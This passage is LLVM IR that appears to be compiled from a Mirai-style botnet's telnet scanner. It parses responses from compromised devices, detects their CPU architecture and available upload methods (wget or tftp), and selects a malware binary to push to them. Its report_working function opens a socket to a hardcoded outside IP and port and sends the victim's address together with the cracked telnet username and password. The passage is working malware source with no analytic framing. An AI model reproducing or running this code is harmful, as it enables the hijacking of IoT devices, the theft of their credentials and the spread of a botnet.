  %139 = icmp eq i32 %138, 0
  br i1 %139, label %140, label %141

; <label>:140:                                    ; preds = %137
  store i32 1, i32* %5, align 4
  br label %141

; <label>:141:                                    ; preds = %140, %137
  %142 = load i32, i32* %5, align 4
  %143 = icmp eq i32 %142, -1
  br i1 %143, label %144, label %145

; <label>:144:                                    ; preds = %141
  store i32 0, i32* %2, align 4
  br label %147

; <label>:145:                                    ; preds = %141
  %146 = load i32, i32* %5, align 4
  store i32 %146, i32* %2, align 4
  br label %147

; <label>:147:                                    ; preds = %145, %144, %54, %44, %34, %24, %14
  %148 = load i32, i32* %2, align 4
  ret i32 %148
}

declare void @table_unlock_val(i8 zeroext) #2

declare i8* @table_retrieve_val(i32, i32*) #2

declare void @table_lock_val(i8 zeroext) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_resp_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  call void @table_unlock_val(i8 zeroext 12)
  %7 = call i8* @table_retrieve_val(i32 12, i32* %6)
  store i8* %7, i8** %4, align 8
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 4
  %13 = load i32, i32* %12, align 8
  %14 = load i8*, i8** %4, align 8
  %15 = load i32, i32* %6, align 4
  %16 = sub nsw i32 %15, 1
  %17 = call i32 @util_memsearch(i8* %10, i32 %13, i8* %14, i32 %16)
  store i32 %17, i32* %5, align 4
  %18 = load i32, i32* %5, align 4
  %19 = icmp eq i32 %18, -1
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %1
  call void @table_lock_val(i8 zeroext 12)
  store i32 0, i32* %2, align 4
  br label %23

; <label>:21:                                     ; preds = %1
  call void @table_lock_val(i8 zeroext 12)
  %22 = load i32, i32* %5, align 4
  store i32 %22, i32* %2, align 4
  br label %23

; <label>:23:                                     ; preds = %21, %20
  %24 = load i32, i32* %2, align 4
  ret i32 %24
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #6

; Function Attrs: noinline nounwind uwtable
define internal i32 @parse_elf_response(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 0, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.131, i32 0, i32 0), i8** %6, align 8
  store i32 0, i32* %4, align 4
  br label %9

; <label>:9:                                      ; preds = %36, %1
  %10 = load i32, i32* %4, align 4
  %11 = icmp slt i32 %10, 8192
  br i1 %11, label %12, label %39

; <label>:12:                                     ; preds = %9
  %13 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %13, i32 0, i32 7
  %15 = load i32, i32* %4, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [8192 x i8], [8192 x i8]* %14, i64 0, i64 %16
  %18 = load i8, i8* %17, align 1
  %19 = sext i8 %18 to i32
  %20 = load i8*, i8** %6, align 8
  %21 = load i32, i32* %5, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds i8, i8* %20, i64 %22
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %19, %25
  br i1 %26, label %27, label %34

; <label>:27:                                     ; preds = %12
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %5, align 4
  %30 = icmp eq i32 %29, 4
  br i1 %30, label %31, label %33

; <label>:31:                                     ; preds = %27
  %32 = load i32, i32* %4, align 4
  store i32 %32, i32* %5, align 4
  br label %39

; <label>:33:                                     ; preds = %27
  br label %35

; <label>:34:                                     ; preds = %12
  store i32 0, i32* %5, align 4
  br label %35

; <label>:35:                                     ; preds = %34, %33
  br label %36

; <label>:36:                                     ; preds = %35
  %37 = load i32, i32* %4, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %4, align 4
  br label %9

; <label>:39:                                     ; preds = %31, %9
  %40 = load i32, i32* %5, align 4
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %43, label %42

; <label>:42:                                     ; preds = %39
  store i32 0, i32* %2, align 4
  br label %171

; <label>:43:                                     ; preds = %39
  %44 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %45 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %44, i32 0, i32 7
  %46 = load i32, i32* %5, align 4
  %47 = add nsw i32 %46, 2
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds [8192 x i8], [8192 x i8]* %45, i64 0, i64 %48
  %50 = load i8, i8* %49, align 1
  %51 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %52 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %51, i32 0, i32 11
  store i8 %50, i8* %52, align 2
  %53 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %54 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %53, i32 0, i32 7
  %55 = load i32, i32* %5, align 4
  %56 = add nsw i32 %55, 15
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds [8192 x i8], [8192 x i8]* %54, i64 0, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i16
  %61 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %62 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %61, i32 0, i32 14
  store i16 %60, i16* %62, align 2
  %63 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %64 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %63, i32 0, i32 14
  %65 = load i16, i16* %64, align 2
  %66 = zext i16 %65 to i32
  %67 = icmp eq i32 %66, 65
  br i1 %67, label %68, label %71

; <label>:68:                                     ; preds = %43
  %69 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %70 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %69, i32 0, i32 14
  store i16 8, i16* %70, align 2
  br label %71

; <label>:71:                                     ; preds = %68, %43
  %72 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %73 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %72, i32 0, i32 14
  %74 = load i16, i16* %73, align 2
  %75 = zext i16 %74 to i32
  %76 = icmp eq i32 %75, 0
  br i1 %76, label %83, label %77

; <label>:77:                                     ; preds = %71
  %78 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %79 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %78, i32 0, i32 11
  %80 = load i8, i8* %79, align 2
  %81 = zext i8 %80 to i32
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %83, label %84

; <label>:83:                                     ; preds = %77, %71
  store i32 -1, i32* %2, align 4
  br label %171

; <label>:84:                                     ; preds = %77
  %85 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %86 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %85, i32 0, i32 14
  %87 = load i16, i16* %86, align 2
  %88 = zext i16 %87 to i32
  %89 = icmp eq i32 %88, 40
  br i1 %89, label %90, label %91

; <label>:90:                                     ; preds = %84
  store i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i32 0, i32 0), i8** %7, align 8
  br label %164

; <label>:91:                                     ; preds = %84
  %92 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %93 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %92, i32 0, i32 14
  %94 = load i16, i16* %93, align 2
  %95 = zext i16 %94 to i32
  %96 = icmp eq i32 %95, 183
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %91
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8** %7, align 8
  br label %163

; <label>:98:                                     ; preds = %91
  %99 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %100 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %99, i32 0, i32 14
  %101 = load i16, i16* %100, align 2
  %102 = zext i16 %101 to i32
  %103 = icmp eq i32 %102, 62
  br i1 %103, label %104, label %105

; <label>:104:                                    ; preds = %98
  store i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.133, i32 0, i32 0), i8** %7, align 8
  br label %162

; <label>:105:                                    ; preds = %98
  %106 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %107 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %106, i32 0, i32 14
  %108 = load i16, i16* %107, align 2
  %109 = zext i16 %108 to i32
  %110 = icmp eq i32 %109, 8
  br i1 %110, label %111, label %117

; <label>:111:                                    ; preds = %105
  %112 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %113 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %112, i32 0, i32 11
  %114 = load i8, i8* %113, align 2
  %115 = zext i8 %114 to i32
  %116 = icmp eq i32 %115, 2
  br i1 %116, label %129, label %117

; <label>:117:                                    ; preds = %111, %105
  %118 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %119 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %118, i32 0, i32 14
  %120 = load i16, i16* %119, align 2
  %121 = zext i16 %120 to i32
  %122 = icmp eq i32 %121, 10
  br i1 %122, label %123, label %132

; <label>:123:                                    ; preds = %117
  %124 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %125 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %124, i32 0, i32 11
  %126 = load i8, i8* %125, align 2
  %127 = zext i8 %126 to i32
  %128 = icmp eq i32 %127, 2
  br i1 %128, label %129, label %132

; <label>:129:                                    ; preds = %123, %111
  %130 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %131 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %130, i32 0, i32 14
  store i16 8, i16* %131, align 2
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.134, i32 0, i32 0), i8** %7, align 8
  br label %161

; <label>:132:                                    ; preds = %123, %117
  %133 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %134 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %133, i32 0, i32 14
  %135 = load i16, i16* %134, align 2
  %136 = zext i16 %135 to i32
  %137 = icmp eq i32 %136, 8
  br i1 %137, label %138, label %144

; <label>:138:                                    ; preds = %132
  %139 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %140 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %139, i32 0, i32 11
  %141 = load i8, i8* %140, align 2
  %142 = zext i8 %141 to i32
  %143 = icmp eq i32 %142, 1
  br i1 %143, label %156, label %144

; <label>:144:                                    ; preds = %138, %132
  %145 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %146 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %145, i32 0, i32 14
  %147 = load i16, i16* %146, align 2
  %148 = zext i16 %147 to i32
  %149 = icmp eq i32 %148, 10
  br i1 %149, label %150, label %159

; <label>:150:                                    ; preds = %144
  %151 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %152 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %151, i32 0, i32 11
  %153 = load i8, i8* %152, align 2
  %154 = zext i8 %153 to i32
  %155 = icmp eq i32 %154, 1
  br i1 %155, label %156, label %159

; <label>:156:                                    ; preds = %150, %138
  %157 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %158 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %157, i32 0, i32 14
  store i16 8, i16* %158, align 2
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.135, i32 0, i32 0), i8** %7, align 8
  br label %160

; <label>:159:                                    ; preds = %150, %144
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.116, i32 0, i32 0), i8** %7, align 8
  br label %160

; <label>:160:                                    ; preds = %159, %156
  br label %161

; <label>:161:                                    ; preds = %160, %129
  br label %162

; <label>:162:                                    ; preds = %161, %104
  br label %163

; <label>:163:                                    ; preds = %162, %97
  br label %164

; <label>:164:                                    ; preds = %163, %90
  %165 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %166 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %165, i32 0, i32 8
  %167 = getelementptr inbounds [16 x i8], [16 x i8]* %166, i32 0, i32 0
  %168 = load i8*, i8** %7, align 8
  %169 = call i8* @strcpy(i8* %167, i8* %168) #7
  %170 = load i32, i32* %5, align 4
  store i32 %170, i32* %2, align 4
  br label %171

; <label>:171:                                    ; preds = %164, %83, %42
  %172 = load i32, i32* %2, align 4
  ret i32 %172
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_arm_subtype(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  call void @table_unlock_val(i8 zeroext 12)
  %7 = call i8* @table_retrieve_val(i32 12, i32* %6)
  store i8* %7, i8** %4, align 8
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 4
  %13 = load i32, i32* %12, align 8
  %14 = load i8*, i8** %4, align 8
  %15 = load i32, i32* %6, align 4
  %16 = sub nsw i32 %15, 1
  %17 = call i32 @util_memsearch(i8* %10, i32 %13, i8* %14, i32 %16)
  store i32 %17, i32* %5, align 4
  call void @table_lock_val(i8 zeroext 12)
  %18 = load i32, i32* %5, align 4
  %19 = icmp eq i32 %18, -1
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %51

; <label>:21:                                     ; preds = %1
  %22 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %22, i32 0, i32 7
  %24 = getelementptr inbounds [8192 x i8], [8192 x i8]* %23, i32 0, i32 0
  %25 = load i32, i32* %5, align 4
  %26 = sub nsw i32 %25, 1
  %27 = call i32 @util_memsearch(i8* %24, i32 %26, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.136, i32 0, i32 0), i32 5)
  %28 = icmp ne i32 %27, -1
  br i1 %28, label %37, label %29

; <label>:29:                                     ; preds = %21
  %30 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %31 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %30, i32 0, i32 7
  %32 = getelementptr inbounds [8192 x i8], [8192 x i8]* %31, i32 0, i32 0
  %33 = load i32, i32* %5, align 4
  %34 = sub nsw i32 %33, 1
  %35 = call i32 @util_memsearch(i8* %32, i32 %34, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.137, i32 0, i32 0), i32 5)
  %36 = icmp ne i32 %35, -1
  br i1 %36, label %37, label %44

; <label>:37:                                     ; preds = %29, %21
  %38 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %39 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %38, i32 0, i32 8
  %40 = getelementptr inbounds [16 x i8], [16 x i8]* %39, i32 0, i32 0
  %41 = call i8* @strcpy(i8* %40, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.138, i32 0, i32 0)) #7
  %42 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %43 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %42, i32 0, i32 14
  store i16 41, i16* %43, align 2
  br label %49

; <label>:44:                                     ; preds = %29
  %45 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %46 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %45, i32 0, i32 8
  %47 = getelementptr inbounds [16 x i8], [16 x i8]* %46, i32 0, i32 0
  %48 = call i8* @strcpy(i8* %47, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.109, i32 0, i32 0)) #7
  br label %49

; <label>:49:                                     ; preds = %44, %37
  %50 = load i32, i32* %5, align 4
  store i32 %50, i32* %2, align 4
  br label %51

; <label>:51:                                     ; preds = %49, %20
  %52 = load i32, i32* %2, align 4
  ret i32 %52
}

; Function Attrs: noinline nounwind uwtable
define internal void @report_working(i32, i32, %struct.scanner_connection*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.scanner_connection*, align 8
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.resolv_entries*, align 8
  %13 = alloca %union.__SOCKADDR_ARG, align 8
  store i32 %0, i32* %5, align 4
  store i32 %1, i32* %6, align 4
  store %struct.scanner_connection* %2, %struct.scanner_connection** %7, align 8
  store i32 %3, i32* %8, align 4
  %14 = call i32 @fork() #7
  store i32 %14, i32* %10, align 4
  store %struct.resolv_entries* null, %struct.resolv_entries** %12, align 8
  %15 = load i32, i32* %10, align 4
  %16 = icmp sgt i32 %15, 0
  br i1 %16, label %20, label %17

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %10, align 4
  %19 = icmp eq i32 %18, -1
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %17, %4
  ret void

; <label>:21:                                     ; preds = %17
  %22 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %22, i32* %11, align 4
  %23 = icmp eq i32 %22, -1
  br i1 %23, label %24, label %25

; <label>:24:                                     ; preds = %21
  call void @exit(i32 0) #8
  unreachable

; <label>:25:                                     ; preds = %21
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %26, align 4
  %27 = call i32 @htonl(i32 -1335130672) #9
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %29 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %28, i32 0, i32 0
  store i32 %27, i32* %29, align 4
  %30 = call zeroext i16 @htons(i16 zeroext 1293) #9
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i32, i32* %11, align 4
  %33 = bitcast %union.__SOCKADDR_ARG* %13 to %struct.sockaddr**
  %34 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %34, %struct.sockaddr** %33, align 8
  %35 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %13, i32 0, i32 0
  %36 = load %struct.sockaddr*, %struct.sockaddr** %35, align 8
  %37 = call i32 @connect(i32 %32, %struct.sockaddr* %36, i32 16)
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %42

; <label>:39:                                     ; preds = %25
  %40 = load i32, i32* %11, align 4
  %41 = call i32 @close(i32 %40)
  call void @exit(i32 0) #8
  unreachable

; <label>:42:                                     ; preds = %25
  %43 = load i32, i32* %11, align 4
  %44 = load i32, i32* %5, align 4
  %45 = and i32 %44, 255
  %46 = load i32, i32* %5, align 4
  %47 = lshr i32 %46, 8
  %48 = and i32 %47, 255
  %49 = load i32, i32* %5, align 4
  %50 = lshr i32 %49, 16
  %51 = and i32 %50, 255
  %52 = load i32, i32* %5, align 4
  %53 = lshr i32 %52, 24
  %54 = and i32 %53, 255
  %55 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %56 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %55, i32 0, i32 0
  %57 = load %struct.scanner_auth*, %struct.scanner_auth** %56, align 8
  %58 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %57, i32 0, i32 0
  %59 = load i8*, i8** %58, align 8
  %60 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %61 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %60, i32 0, i32 0
  %62 = load %struct.scanner_auth*, %struct.scanner_auth** %61, align 8
  %63 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %62, i32 0, i32 1
  %64 = load i8*, i8** %63, align 8
  %65 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %66 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %65, i32 0, i32 8
  %67 = getelementptr inbounds [16 x i8], [16 x i8]* %66, i32 0, i32 0
  %68 = load i32, i32* %8, align 4
  %69 = icmp eq i32 %68, 1
  %70 = select i1 %69, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.129, i32 0, i32 0)
  %71 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %72 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %71, i32 0, i32 1
  %73 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %72, i32 0, i32 1
  %74 = load i32, i32* %73, align 4
  %75 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %76 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %75, i32 0, i32 9
  %77 = load i8, i8* %76, align 4
  %78 = zext i8 %77 to i32
  %79 = call i32 (i32, i8*, ...) @fdsend(i32 %43, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.127, i32 0, i32 0), i32 %45, i32 %48, i32 %51, i32 %54, i8* %59, i8* %64, i8* %67, i8* %70, i32 %74, i32 %78)
  %80 = load i32, i32* %11, align 4
  %81 = call i32 @close(i32 %80)
  call void @exit(i32 0) #8
  unreachable
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @connection_consume_upload_methods(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  call void @table_unlock_val(i8 zeroext 12)
  %7 = call i8* @table_retrieve_val(i32 12, i32* %6)
  store i8* %7, i8** %4, align 8
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 4
  %13 = load i32, i32* %12, align 8
  %14 = load i8*, i8** %4, align 8
  %15 = load i32, i32* %6, align 4
  %16 = sub nsw i32 %15, 1
  %17 = call i32 @util_memsearch(i8* %10, i32 %13, i8* %14, i32 %16)
  store i32 %17, i32* %5, align 4
  call void @table_lock_val(i8 zeroext 12)
  %18 = load i32, i32* %5, align 4
  %19 = icmp eq i32 %18, -1
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %52

; <label>:21:                                     ; preds = %1
  %22 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %22, i32 0, i32 7
  %24 = getelementptr inbounds [8192 x i8], [8192 x i8]* %23, i32 0, i32 0
  %25 = load i32, i32* %5, align 4
  %26 = sub nsw i32 %25, 1
  %27 = call i32 @util_memsearch(i8* %24, i32 %26, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.148, i32 0, i32 0), i32 10)
  %28 = icmp ne i32 %27, -1
  br i1 %28, label %29, label %33

; <label>:29:                                     ; preds = %21
  %30 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %31 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %30, i32 0, i32 1
  %32 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %31, i32 0, i32 1
  store i32 1, i32* %32, align 4
  br label %50

; <label>:33:                                     ; preds = %21
  %34 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %35 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %34, i32 0, i32 7
  %36 = getelementptr inbounds [8192 x i8], [8192 x i8]* %35, i32 0, i32 0
  %37 = load i32, i32* %5, align 4
  %38 = sub nsw i32 %37, 1
  %39 = call i32 @util_memsearch(i8* %36, i32 %38, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.149, i32 0, i32 0), i32 10)
  %40 = icmp ne i32 %39, -1
  br i1 %40, label %41, label %45

; <label>:41:                                     ; preds = %33
  %42 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %43 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %42, i32 0, i32 1
  %44 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %43, i32 0, i32 1
  store i32 2, i32* %44, align 4
  br label %49

; <label>:45:                                     ; preds = %33
  %46 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %47 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %46, i32 0, i32 1
  %48 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %47, i32 0, i32 1
  store i32 0, i32* %48, align 4
  br label %49

; <label>:49:                                     ; preds = %45, %41
  br label %50

; <label>:50:                                     ; preds = %49, %29
  %51 = load i32, i32* %5, align 4
  store i32 %51, i32* %2, align 4
  br label %52

; <label>:52:                                     ; preds = %50, %20
  %53 = load i32, i32* %2, align 4
  ret i32 %53
}

; Function Attrs: noinline nounwind uwtable
define internal %struct.payload* @get_retrieve_binary(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.payload*, align 8
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i32, align 4
  %5 = alloca %struct.payload*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 0, i32* %4, align 4
  %6 = load i32, i32* %4, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 %7
  store %struct.payload* %8, %struct.payload** %5, align 8
  br label %9

; <label>:9:                                      ; preds = %38, %1
  %10 = load %struct.payload*, %struct.payload** %5, align 8
  %11 = icmp ne %struct.payload* %10, null
  br i1 %11, label %12, label %43

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, 4
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %12
  br label %43

; <label>:16:                                     ; preds = %12
  %17 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %18 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %17, i32 0, i32 11
  %19 = load i8, i8* %18, align 2
  %20 = zext i8 %19 to i32
  %21 = load %struct.payload*, %struct.payload** %5, align 8
  %22 = getelementptr inbounds %struct.payload, %struct.payload* %21, i32 0, i32 0
  %23 = load i8, i8* %22, align 8
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %20, %24
  br i1 %25, label %26, label %38

; <label>:26:                                     ; preds = %16
  %27 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %27, i32 0, i32 14
  %29 = load i16, i16* %28, align 2
  %30 = zext i16 %29 to i32
  %31 = load %struct.payload*, %struct.payload** %5, align 8
  %32 = getelementptr inbounds %struct.payload, %struct.payload* %31, i32 0, i32 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 %30, %34
  br i1 %35, label %36, label %38

; <label>:36:                                     ; preds = %26
  %37 = load %struct.payload*, %struct.payload** %5, align 8
  store %struct.payload* %37, %struct.payload** %2, align 8
  br label %44

; <label>:38:                                     ; preds = %26, %16
  %39 = load %struct.payload*, %struct.payload** %5, align 8
  %40 = getelementptr inbounds %struct.payload, %struct.payload* %39, i32 1
  store %struct.payload* %40, %struct.payload** %5, align 8
  %41 = load i32, i32* %4, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %4, align 4
  br label %9

; <label>:43:                                     ; preds = %15, %9
  store %struct.payload* null, %struct.payload** %2, align 8
  br label %44

; <label>:44:                                     ; preds = %43, %36
  %45 = load %struct.payload*, %struct.payload** %2, align 8
  ret %struct.payload* %45
}

; Function Attrs: noinline nounwind uwtable
define internal %struct.binary* @process_retrieve_binary(%struct.payload*) #0 {
  %2 = alloca %struct.payload*, align 8
